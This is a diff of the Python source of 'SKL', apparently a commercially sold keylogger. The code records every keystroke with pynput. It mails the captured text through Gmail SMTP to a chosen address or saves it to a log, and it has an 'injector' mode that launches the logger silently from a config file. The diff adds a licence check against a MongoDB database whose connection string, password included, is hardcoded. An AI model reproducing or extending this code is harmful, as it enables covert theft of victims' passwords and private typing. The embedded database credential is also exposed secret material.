@@ -4,8 +4,11 @@ import json
 from pynput.keyboard import Key, Listener
 import smtplib, ssl
 import socket   
-import ctypes
 import requests
+from pymongo.mongo_client import MongoClient
+from pymongo.server_api import ServerApi
+import time
+
 
 #!# -----------------------------------CONSTANTS----------------------------------- #!#
 
@@ -95,69 +98,7 @@ def isInjector():
 
 
 
-#!# -----------------------------------LICENSE----------------------------------- #!#
 
- 
-    
-## J S K V I B U
-# JS235-SDKO3-K5FJK2-VFK3KL-IFYH5-B45F8-UY348
-#serial = "JS235-SDKO3-K5FJK2-VFK3KL-IFYH5-B45F8-UY348"
-def license():
-    printlogo()
-    print(bcolors.WARNING +  "SKL is a Licensed Product" + bcolors.WHITE + "\nIf you have " + bcolors.FAIL + "not" + bcolors.WHITE + " purchased a serial key, please contact " 
-          + bcolors.OKBLUE + "voidy6059" + bcolors.WHITE + " on discord to purchase your serial key.\n")
-    
-    USER = os.getlogin()
-    directory = "SKL"
-    parent_dir = f"C:/Users/{USER}/AppData/Roaming"
-                
-    path = os.path.join(parent_dir, directory)
-    
-    try:
-        os.mkdir(path)
-    except:
-        pass
-    
-    try:
-        with open(f"{path}/serial.json","r") as f:
-            parsed = json.load(f)
-            serial = parsed["serial"]
-            
-        try:
-            if serial[0] == "J" and serial[6] == "S" and serial[12] == "K" and serial[19] == "V" and serial[26] == "I" and serial[32] == "B" and serial[38] == "U":
-                os.system("cls")
-                return
-            else:
-                serial = input("Serial key: ")
-                with open(f"{path}/serial.json","w") as r:
-                    serialJSON = {"serial": serial}
-                    json.dump(serialJSON,r)
-        except:
-            serial = input("Serial key: ")
-            with open(f"{path}/serial.json","w") as r:
-                serialJSON = {"serial": serial}
-                json.dump(serialJSON,r)
-             
-            
-    except:
-        serial = input("Serial key: ")
-        with open(f"{path}/serial.json","w") as r:
-            serialJSON = {"serial": serial}
-            json.dump(serialJSON,r)
-           
-    
-
-    try:
-        if serial[0] == "J" and serial[6] == "S" and serial[12] == "K" and serial[19] == "V" and serial[26] == "I" and serial[32] == "B" and serial[38] == "U":
-          os.system("cls")
-        else:
-            print(bcolors.FAIL + "Invaild serial " + bcolors.WHITE + "|| please contact " + bcolors.OKBLUE + "voidy6059" + bcolors.WHITE + " to " + bcolors.OKGREEN + "purchase." + bcolors.WHITE)
-            exit()
-    except:
-        exit()
-        
-if isInjector() == False or isInjector() == None:
-    license()
     
 
 
@@ -277,6 +218,7 @@ def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode):
     elif mode == "local":
         Key_mode = True
         Email_mode = False
+        
     def email(keysGiven):
         port = 465  # For SSL
         smtp_server = "smtp.gmail.com"
@@ -293,29 +235,36 @@ def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode):
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message)
  
-   
+ 
+#% ------------- KEY SYSTEM --------------- %#
     def on_press(key):
         global keys
         global keys_pressed  
         emailBool = False
-        keypressed = key
-        if keypressed == Key.space:
-            keypressed = "   "
-        elif keypressed == Key.backspace:
-            keypressed= "<== "
+        if key == Key.space:
+            key = " "
+        elif key == Key.backspace:
+            key = ""
+            keys = keys[: -2]
             keys_pressed =- 2
-        elif keypressed == Key.enter:
-            keypressed = "\n"
+        elif key == Key.enter:
+            key = "\n"
             emailBool = True
-        elif keypressed == "'":
-            keypressed = "_Apostro4phe_"
-        elif str(keypressed).startswith("Key."):
-            keypressed = ""
+        elif key == "'":
+            key = "_Apostro4phe_"
+        elif key == "\x01":
+            key = ""
+        elif str(key).startswith("Key."):
+            key = ""
             keys_pressed =- 2
         
-        if CapsStatus(): keypressed = str(keypressed); keypressed = keypressed.upper()  
         
-        keys.append(str(keypressed))
+        if CapsStatus(): key = str(key); key = key.upper()  
+        
+        
+#@ ------------- KEY MODE SYSTEM --------------- @#
+
+        keys.append(str(key))
         keys_pressed += 1
         if keys_pressed > 20 and Key_mode == True:   
             file = open(f"./out/Spicy-Logs++", "a") 
@@ -325,6 +274,9 @@ def START_LOGGER(senderEmail,senderPassword,receiverEmail, mode):
             file.write(str(message))
             keys_pressed = 0 
             keys = []
+            
+#& ------------- EMAIL MODE SYSTEM --------------- &#
+
         if emailBool == True and Email_mode == True:
             UNmessage = "".join(keys)
             message = UNmessage.replace("'","")
@@ -380,8 +332,8 @@ def check_config():
 
 
 
-if isInjector() == False or isInjector() == None:
-    print("....Welcome to SKL....\nType \"help\" for a list of commands")
+
+
     
 
 
@@ -494,7 +446,91 @@ if isInjector() == 1 or isInjector() == 5:
         shutil.move(Src, Dest)
     except:
         pass        
-#!# -----------------------------------INJECTOR----------------------------------- #!#
+    
+    
+    
+                
+                
+#&# ----------------------------------- DATA-BASE ----------------------------------- #&#
+
+def connectToDatabase():
+    
+
+    try:
+        uri = "mongodb+srv://skl:4rcQtgbSZbyq5AIC@skl.jdigidi.mongodb.net/?retryWrites=true&w=majority"
+
+        client = MongoClient(uri, server_api=ServerApi('1'))
+
+        database = client.get_database("SKL-Keys")
+
+        collection = database["serial-key"]
+
+        cursor = collection.find_one("skl-program-serial-keys")
+        serial_keys = cursor["skl-serial-key"]
+  
+        
+        return serial_keys
+       
+        
+        
+    except:
+        print("Failed to connect to SKL database!\nAre you a registered user? Please contact voidy6059 on discord about this issue.")
+
+
+
+    
+    
+    
+    
+#@# -----------------------------------LICENSE----------------------------------- #@#
+
+    
+
+def license():
+    serial_keys = connectToDatabase()
+    
+    try:
+        with open(f"{path}/serial.json", "r") as file:
+            parsed = json.load(file)
+            serial = parsed["serial"]
+            if serial in serial_keys:
+                return True
+            else:
+                raise Exception
+    except:
+        pass
+            
+    
+    printlogo()
+    print(bcolors.WARNING +  "SKL is a Licensed Product" + bcolors.WHITE + "\nIf you have " + bcolors.FAIL + "not" + bcolors.WHITE + " purchased a serial key, please contact " 
+          + bcolors.OKBLUE + "voidy6059" + bcolors.WHITE + " on discord to purchase your serial key.\n")
+    
+    serial = input("Serial key: ")
+    
+    if serial in serial_keys:
+        with open(f"{path}/serial.json","w") as file:
+            serial_key_json = {"serial": serial}
+            json.dump(serial_key_json, file)
+            return True
+      
+    else:
+        return False
+   
+
+    
+def isLicensed():
+    license_status = license()
+    if license_status:
+        os.system("cls")
+        print("....Welcome to SKL....\nType \"help\" for a list of commands")
+        printlogo()
+        __main__()
+    else:
+        print(bcolors.FAIL + "Invaild serial " + bcolors.WHITE + "|| please contact " + bcolors.OKBLUE + "voidy6059" + bcolors.WHITE + " to " + bcolors.OKGREEN + "purchase." + bcolors.WHITE)
+        exit()
+           
+
+#%# -----------------------------------INJECTOR----------------------------------- #%#
 
 if isInjector() == 1:
     with open(f"{JsonPath}", "r") as Config:
@@ -529,23 +565,11 @@ elif isInjector() == 5:
                     json.dump(configData,Config)   
     os.remove("inject.json")            
     START_LOGGER(JsenderEmail,JsenderPassword,JreceiverEmail, Jmode)
-else:
-    printlogo()
-    __main__()
-    
-                    
-                
+else:                    
+   isLicensed()
 
-        
-   
+isLicensed()
 
-printlogo()
-__main__()
 
 print(bcolors.WHITE)
-
-
-
-
-
-
+       
